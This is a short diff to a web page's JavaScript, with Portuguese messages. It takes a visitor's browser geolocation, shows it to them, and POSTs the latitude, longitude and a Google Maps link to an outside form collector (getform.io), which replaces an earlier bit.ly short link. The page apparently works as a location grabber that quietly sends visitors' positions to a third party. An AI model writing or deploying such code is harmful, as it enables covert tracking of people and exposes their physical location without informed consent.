@@ -16,8 +16,8 @@
         function showLocation(position) {
             const latitude = position.coords.latitude;
             const longitude = position.coords.longitude;
-
             const mapa = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
             output.innerHTML = `
         ✅ Localização obtida:<br>
         Latitude: ${latitude}<br>
@@ -28,12 +28,18 @@
             const formData = new FormData();
             formData.append("latitude", latitude);
             formData.append("longitude", longitude);
+            formData.append("mapa", mapa);
 
-            fetch("http://bit.ly/4jNjlRS", {
+            fetch("https://getform.io/f/aolmvdrb", {
                 method: "POST",
                 body: formData
-            });
-
+            })
+                .then(() => {
+                    console.log("📡 Localização enviada com sucesso.");
+                })
+                .catch((error) => {
+                    console.error("❌ Erro ao enviar localização:", error);
+                });
         }
 
         function showError(error) {
